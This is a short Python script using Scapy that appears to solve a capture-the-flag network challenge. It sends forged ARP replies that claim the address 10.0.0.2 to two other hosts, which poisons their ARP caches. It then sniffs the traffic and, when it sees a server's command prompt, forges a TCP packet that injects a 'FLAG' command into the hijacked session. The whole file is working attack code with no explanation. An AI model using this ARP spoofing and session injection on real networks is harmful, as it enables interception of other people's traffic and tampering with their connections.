from scapy.all import *
sendp(Ether(src=get_if_hwaddr("eth0"), dst="ff:ff:ff:ff:ff:ff",type=0x0806)/ARP(op="who-has",hwsrc=get_if_hwaddr("eth0"),psrc="10.0.0.2",pdst="10.0.0.4"),iface="eth0")
sendp(Ether(src=get_if_hwaddr("eth0"), dst="ff:ff:ff:ff:ff:ff",type=0x0806)/ARP(op="who-has",hwsrc=get_if_hwaddr("eth0"),psrc="10.0.0.2",pdst="10.0.0.3"),iface="eth0")
def abcd(packet):
    if TCP not in packet:
        return
    if not ("P" in packet[TCP].flags):
        return
    if packet[Raw].load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
        print("============================")
        res = Ether(src=packet[Ether].dst, dst = packet[Ether].src) / IP(src = packet[IP].dst, dst = packet[IP].src) / TCP(sport = packet[TCP].dport, dport=packet[TCP].sport, seq=packet[TCP].ack, ack = packet[TCP].seq + 29, flags="PA") / b"FLAG\n"
        sendp(res,iface="eth0")
    print(packet)
    print(packet[TCP].seq)
    print(packet[TCP].ack)
    print(packet[Raw].load)
sniff(prn=abcd,iface="eth0")

